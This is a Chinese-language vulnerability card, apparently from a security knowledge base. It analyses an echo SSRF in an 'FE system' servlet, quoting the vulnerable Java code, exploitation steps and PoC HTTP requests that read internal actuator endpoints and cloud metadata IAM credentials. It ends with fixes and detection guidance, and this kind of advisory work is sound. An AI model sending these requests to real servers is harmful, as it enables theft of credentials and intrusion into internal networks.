---
id: web-generic-ssrf-fe-proxyservletutil-url-echo
title: FE 系统 ProxyServletUtil url 参数直入 new URL/openConnection：有回显 SSRF 读取内网 HTTP 响应
type: scenario
domain: web
path: web/generic/ssrf
technique: proxy-servlet-url-openconnection-echo-ssrf
aliases:
- ProxyServletUtil SSRF
- /servlet/proxyServletUtil SSRF
- urlString SSRF
- 有回显 SSRF
- Java URLConnection SSRF
- FE 系统 SSRF
tags:
- java
- servlet
- ssrf
- urlconnection
- echo
- internal-network
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T08:54:41+08:00'
  notes: 已对照原文及49张图核对：图24-25 ProxyServletUtil doGet 取 url 参数直入 writeResponse，new URL→new File(url.getFile())→exists 则 return→openConnection→getInputStream→原样写回响应，与卡一致；卡正确指出 file:// 直读会被 File.exists 守卫挡住，主结论限定为有回显 HTTP/HTTPS SSRF；并注明 ControllerFilter5 覆盖 /servlet/* 需会话。原文无实际 SSRF 响应截图。PoC 未在本机执行。
---

## 一句话结论

FE 系统的 `ProxyServletUtil` 把请求参数 `url` 直接传给 `new URL(urlString)` 并 `openConnection().getInputStream()`，随后把响应字节原样写回客户端；攻击者可让服务端访问内网 HTTP/HTTPS 服务并读取完整响应，形成有回显 SSRF。

## 原理

- **入口**：
  ```java
  @WebServlet(name="ProxyServletUtil", urlPatterns={"/servlet/proxyServletUtil"})
  public class ProxyServletUtil extends HttpServlet {
      public void doGet(HttpServletRequest request, HttpServletResponse response) {
          String urlString = request.getParameter("url");
          this.writeResponse(response, urlString);
      }
  }
  ```
- **请求逻辑**：
  ```java
  URL url = new URL(urlString);
  File file = new File(url.getFile());
  if (file.exists()) { return; }
  URLConnection urlConnection = url.openConnection();
  response.setContentType(urlConnection.getContentType());
  InputStream ins = urlConnection.getInputStream();
  ServletOutputStream outs = response.getOutputStream();
  byte[] buffer = new byte[1024];
  while ((bytesRead = ins.read(buffer, 0, 1024)) != -1) {
      outs.write(buffer, 0, bytesRead);
  }
  ```
  - 没有协议白名单、主机黑名单、端口限制，也没有内网地址判断；
  - `url.openConnection()` 支持 `http`、`https`、`file`、`jar` 等协议；
  - 读取的是完整响应体并原样回显，属于“有回显”SSRF，能直接看内网页面、API、云元数据（若网络可达）。
- **`File.exists()` 守卫的实际作用**：`new File(url.getFile())` 取的是 URL 的路径部分（对于 HTTP 是 `/path?query`，对于 `file:` 是本地路径）。若该本地路径存在，方法直接 `return`，不发起请求。
  - 对 HTTP/HTTPS：通常本地不存在 `/actuator/env` 这样的文件，守卫不触发，SSRF 成立；
  - 对 `file://`：`file:///etc/passwd` 的 `url.getFile()` 就是 `/etc/passwd`，本地存在 → 直接 return，**直读本地文件会被这个守卫挡住**，不能仅凭“支持 file 协议”就认为文件读取成立。若需评估 file 协议，可测试路径编码/大小写/平台差异，但应视为未验证的附加面，本卡不将其作为主结论。
- **鉴权与可达性**：`@WebFilter ControllerFilter5` 的 `urlPatterns` 包含 `/servlet/*`，而 `proxyServletUtil` 不在白名单 `excludeSet` 中，因此默认需要有效会话；可配合该系统的任意登录漏洞或过滤器路径绕过获得访问权限（见关联卡）。Servlet 自身没有额外鉴权。
- **为什么是 SSRF 而不是命令执行**：`URL` 只发起网络/协议请求并把响应转发，不执行命令；但内网可达的 HTTP 服务、管理面板、云元数据接口都可能被读取，进而泄露凭据或扩大攻击面。

## 触发条件

- 目标部署了 `ProxyServletUtil`，路由 `/servlet/proxyServletUtil` 可访问。
- `url` 参数完全可控，且没有协议/主机/端口/内网地址校验。
- 攻击者能通过会话或鉴权绕过到达该 Servlet（`ControllerFilter5` 覆盖 `/servlet/*`）。
- 目标服务器到内网目标存在网络可达性；HTTP 响应可回显到客户端。

## 利用步骤

1. 确认路由存在：请求 `/servlet/proxyServletUtil?url=http://127.0.0.1:<port>/`，观察响应状态/内容。
2. 若被 302 到登出页，先获取会话（任意登录漏洞）或使用过滤器路径绕过。
3. 探测内网常见服务：`http://127.0.0.1:8080/`、`http://10.x.x.x:80/`、内网 API、管理后台。
4. 读取云元数据（若在云上且网络可达）：`http://169.254.169.254/latest/meta-data/`、`http://metadata.google.internal/...` 等，按目标云厂商调整。
5. 用响应中的版本、路由、凭据继续扩大利用；保存完整响应作为证据。
6. 注意：`url.getFile()` 指向本地已存在路径时会被提前 return，测试时避免 path 与本地文件冲突；换用不存在的路径或带查询串。

## PoC

```http
GET /servlet/proxyServletUtil?url=http://127.0.0.1:8080/actuator/env HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid-session>
```

```http
GET /servlet/proxyServletUtil?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid-session>
```

说明：`File.exists()` 守卫会在 path 命中本地文件时提前返回；PoC 使用本地大概率不存在的 HTTP 路径。原文只给出代码分析，未给出实际 SSRF 响应截图；本会话未执行。

## 变体与关联

- **协议变体**：`https://` 内网服务；`jar:`/`netdoc:` 等协议在特定 JDK 下也可能被 `URL` 解析，但需按实际 JDK 验证，不能默认成立。
- **file 协议边界**：`file:///etc/passwd` 的 `url.getFile()` 命中本地文件会直接 return；编码/平台差异可能绕过 `File.exists()` 但与 `URLConnection` 的解码不一致，属于未验证面，需单独测试。
- **重定向**：`HttpURLConnection` 默认跟随同协议重定向，可用于绕过主机黑名单（若目标后续加了黑名单）。
- **DNS rebinding**：若目标加了域名黑名单但未校验解析后的 IP，可结合 DNS rebinding 访问内网。
- 关联：[[web-generic-auth-fe-login-opd-admin-session]]（任意管理员登录，可为 SSRF 提供会话）；[[web-generic-auth-fe-controllerfilter5-excludepage-prefix-bypass]]（过滤器绕过，可在无会话时到达 `/servlet/*`）；[[web-generic-ssrf-oa-getrawfile-weak-blacklist]]（OA 文件代理 SSRF 的同类形态）。

## 检测与防御

- **代码修复**：不要用用户输入直接构造 `URL`；维护目标主机/端口/协议白名单；解析目标域名后校验 IP 不属于内网/环回/链路本地/云元数据网段；禁用 `file`、`jar` 等非 HTTP 协议；关闭或限制重定向；不要原样回显响应体。
- **网络层**：服务端出站流量只允许必要目标；阻断 169.254.169.254、127.0.0.0/8、10/8、172.16/12、192.168/16 等；元数据服务使用 IMDSv2 或加固。
- **鉴权**：`/servlet/proxyServletUtil` 纳入统一鉴权并限制访问来源；不要仅依赖 `ControllerFilter5` 的路径白名单。
- **检测特征**：`url` 参数含内网 IP、`169.254.169.254`、`localhost`、非 HTTP 协议、非常见端口；响应出现内网服务标题、云元数据 JSON、`actuator` 内容；同一会话短时间内请求多个内网地址/端口；出站连接日志异常。
- **应急**：排查 SSRF 访问过的内网目标与云元数据凭据；轮换可能泄露的临时凭据；限制服务器出站访问并修复 URL 白名单。
